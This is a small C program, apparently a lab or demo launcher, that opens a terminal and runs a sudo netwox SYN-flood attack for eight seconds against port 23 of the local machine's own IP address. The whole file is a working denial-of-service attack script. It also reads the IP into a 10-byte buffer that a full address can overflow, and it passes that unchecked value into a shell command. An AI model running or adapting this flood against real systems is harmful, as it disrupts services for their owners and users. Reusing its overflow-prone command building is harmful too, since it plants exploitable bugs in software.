#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main () {

   char command[150]; 
   char ipString[10];

   char command1[] = "gnome-terminal --title='Injecting Flood Attack...' -e 'sudo timeout 8s netwox 76 -i ";
   char command2[] = " -p 23 -s raw' >/dev/null 2>&1 &";
   FILE *ip = popen("hostname -I", "r");
   fscanf(ip, "%s", ipString);
   snprintf(command, 150, "%s%s%s", command1, ipString, command2);
   //printf("%s", command);
   system(command);

   return(0);
} 

